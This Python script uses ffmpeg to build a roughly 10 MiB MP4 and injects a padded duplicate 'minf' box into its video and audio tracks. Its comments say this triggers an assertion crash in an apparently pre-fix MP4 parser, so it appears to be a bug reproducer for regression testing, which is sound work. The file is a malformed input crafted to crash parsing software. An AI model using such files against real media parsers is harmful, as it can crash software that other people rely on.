#!/usr/bin/env python3
"""Create a roughly 10 MiB MP4 with H.264/AAC and padded duplicate minf
(size >= 16) immediately after stbl in both video and audio tracks.

The duplicate minf is padded to exactly 16 bytes (8-byte header + 8 bytes of filler)
so it passes the EXT_ATOM_HEADER_SZ threshold and gets parsed, overwriting the
m_non_leaves["minf"] pointer and triggering assert(minf_offset < prependsz).
"""
from __future__ import annotations

import argparse
import shutil
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

DEFAULT_TARGET = 10_485_760  # 10 MiB
DEFAULT_DURATION = 30.0
CONTAINERS = {b"moov", b"trak", b"mdia", b"minf", b"stbl", b"dinf", b"edts", b"udta"}


def tool(name: str) -> str:
    value = shutil.which(name)
    if not value:
        raise RuntimeError(f"{name} is required but was not found on PATH")
    return value


def run(command: list[str]) -> None:
    print("+", " ".join(command))
    subprocess.run(command, check=True)


class Box:
    __slots__ = ("type", "payload", "children")

    def __init__(self, box_type: bytes, payload: bytes = b"", children: list["Box"] | None = None):
        self.type = box_type
        self.payload = payload
        self.children = children

    @property
    def size(self) -> int:
        body_size = len(self.payload) if self.children is None else sum(c.size for c in self.children)
        return 8 + body_size

    def to_bytes(self) -> bytes:
        body = self.payload if self.children is None else b"".join(c.to_bytes() for c in self.children)
        return struct.pack(">I4s", 8 + len(body), self.type) + body

    def find_all(self, box_type: bytes) -> list["Box"]:
        found = [self] if self.type == box_type else []
        for child in self.children or ():
            found.extend(child.find_all(box_type))
        return found


def parse_boxes(data: bytes) -> list[Box]:
    result: list[Box] = []
    offset = 0
    while offset < len(data):
        if len(data) - offset < 8:
            raise ValueError("truncated child box header")
        size, box_type = struct.unpack_from(">I4s", data, offset)
        if size == 0:
            size = len(data) - offset
        if size == 1 or size < 8 or offset + size > len(data):
            raise ValueError(f"unsupported or invalid {box_type!r} box")
        body = data[offset + 8:offset + size]
        if box_type in CONTAINERS:
            result.append(Box(box_type, children=parse_boxes(body)))
        else:
            result.append(Box(box_type, body))
        offset += size
    return result


def top_level(path: Path) -> list[tuple[bytes, int, int]]:
    result: list[tuple[bytes, int, int]] = []
    total = path.stat().st_size
    with path.open("rb") as handle:
        offset = 0
        while offset < total:
            handle.seek(offset)
            header = handle.read(8)
            if len(header) != 8:
                raise ValueError("truncated top-level header")
            size, box_type = struct.unpack(">I4s", header)
            if size == 0:
                size = total - offset
            if size == 1 or size < 8 or offset + size > total:
                raise ValueError(f"invalid top-level {box_type!r}")
            result.append((box_type, offset, size))
            offset += size
    return result


def shift_chunk_offsets(moov: Box, delta: int) -> int:
    changed = 0
    for box in moov.find_all(b"stco"):
        count = struct.unpack_from(">I", box.payload, 4)[0]
        values = struct.unpack_from(f">{count}I", box.payload, 8)
        box.payload = box.payload[:8] + struct.pack(f">{count}I", *(v + delta for v in values))
        changed += count
    for box in moov.find_all(b"co64"):
        count = struct.unpack_from(">I", box.payload, 4)[0]
        values = struct.unpack_from(f">{count}Q", box.payload, 8)
        box.payload = box.payload[:8] + struct.pack(f">{count}Q", *(v + delta for v in values))
        changed += count
    return changed


def handler_type(mdia: Box) -> bytes:
    hdlr = next((c for c in mdia.children or () if c.type == b"hdlr"), None)
    if hdlr is None or len(hdlr.payload) < 12:
        return b"????"
    return hdlr.payload[8:12]


def inject_padded_duplicate_minf(moov: Box) -> int:
    """Add a padded (size=16) duplicate minf after stbl in every media track.
    
    The duplicate minf is padded with 8 bytes of zero content so its total size
    is 16 bytes (8-byte header + 8 bytes filler). This ensures it passes the
    EXT_ATOM_HEADER_SZ threshold (16 bytes) in trak.cpp:620 and gets parsed,
    overwriting m_non_leaves["minf"] and triggering the original assertion.
    
    Size breakdown:
      - 4 bytes: size field (0x00000010 = 16)
      - 4 bytes: type field ('minf')
      - 8 bytes: filler/padding (0x00000000 0x00000000)
    """
    injected = 0
    for trak in moov.find_all(b"trak"):
        mdia = next((c for c in trak.children or () if c.type == b"mdia"), None)
        if mdia is None or not mdia.children:
            continue

        genuine_minf_index = next(
            (i for i, child in enumerate(mdia.children) if child.type == b"minf"),
            None,
        )
        if genuine_minf_index is None:
            continue
        genuine_minf = mdia.children[genuine_minf_index]
        if not genuine_minf.children:
            continue

        stbl_index = next(
            (i for i, child in enumerate(genuine_minf.children) if child.type == b"stbl"),
            None,
        )
        if stbl_index is None:
            continue

        # Create a minf box with 8 bytes of padding/filler payload
        # Total size = 8 (header) + 8 (payload) = 16 bytes
        # This passes EXT_ATOM_HEADER_SZ threshold and gets parsed
        padding = b"\x00" * 8
        duplicate_minf = Box(b"minf", payload=padding)
        
        genuine_minf.children.insert(stbl_index + 1, duplicate_minf)
        injected += 1
        track_type = handler_type(mdia).decode(errors='replace')
        print(f"Injected padded (size=16) duplicate minf in {track_type} track")

    return injected


def encode_source(path: Path, target_bytes: int, duration: float) -> None:
    if target_bytes < 64 * 1024 or duration <= 0:
        raise ValueError("--size must be at least 65536 and --duration must be positive")
    ffmpeg = tool("ffmpeg")
    total_bitrate = int(target_bytes * 8 / duration * 0.85)
    audio_bitrate = 128_000
    video_bitrate = max(200_000, total_bitrate - audio_bitrate)
    run([
        ffmpeg, "-y", "-hide_banner", "-loglevel", "error",
        "-f", "lavfi", "-i", "testsrc2=size=1280x720:rate=30",
        "-f", "lavfi", "-i", "sine=frequency=1000:sample_rate=48000",
        "-t", str(duration), "-map", "0:v:0", "-map", "1:a:0",
        "-c:v", "libx264", "-preset", "fast", "-b:v", str(video_bitrate),
        "-pix_fmt", "yuv420p", "-c:a", "aac", "-b:a", str(audio_bitrate),
        "-movflags", "+faststart", str(path),
    ])


def build(source: Path, output: Path) -> None:
    entries = top_level(source)
    _, moov_offset, moov_size = next(e for e in entries if e[0] == b"moov")
    with source.open("rb") as handle:
        handle.seek(moov_offset)
        moov = parse_boxes(handle.read(moov_size))[0]

    old_size = moov.size
    injected = inject_padded_duplicate_minf(moov)
    if injected != 2:
        raise ValueError(f"expected video and audio tracks, injected {injected} duplicate minf boxes")

    delta = moov.size - old_size
    shifted = shift_chunk_offsets(moov, delta)
    replacement = moov.to_bytes()
    output.parent.mkdir(parents=True, exist_ok=True)
    with source.open("rb") as src, output.open("wb") as dst:
        for box_type, offset, size in entries:
            if box_type == b"moov":
                dst.write(replacement)
            else:
                src.seek(offset)
                dst.write(src.read(size))
    print(f"Injected {injected} padded duplicate minf boxes; moov grew {delta} bytes; shifted {shifted} offsets")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output", type=Path, default=Path(__file__).resolve().parent / "output" / "10mb_nested_padded_duplicate_minf.mp4")
    parser.add_argument("--size", type=int, default=DEFAULT_TARGET)
    parser.add_argument("--duration", type=float, default=DEFAULT_DURATION)
    args = parser.parse_args()
    try:
        ffprobe = tool("ffprobe")
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "source.mp4"
            print(f"Encoding source video/audio ({args.duration:g} seconds)...")
            encode_source(source, args.size, args.duration)
            run([ffprobe, "-v", "error", "-show_entries", "stream=index,codec_type,codec_name", "-of", "default=noprint_wrappers=1", str(source)])
            print("Adding padded (size=16) duplicate minf to video and audio tracks...")
            build(source, args.output)
        size = args.output.stat().st_size
        print(f"Created {args.output} ({size:,} bytes, {size / (1024 * 1024):.2f} MiB)")
        print("")
        print("Structure (passes EXT_ATOM_HEADER_SZ threshold):")
        print("  video/audio minf")
        print("    stbl")
        print("    minf size=16+0 (8-byte header + 8-byte padding)")
        print("")
        print("This duplicate minf WILL be parsed and WILL overwrite m_non_leaves[\"minf\"],")
        print("triggering assert(minf_offset < prependsz) on pre-fix trak.cpp")
        return 0
    except (RuntimeError, ValueError, subprocess.CalledProcessError) as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
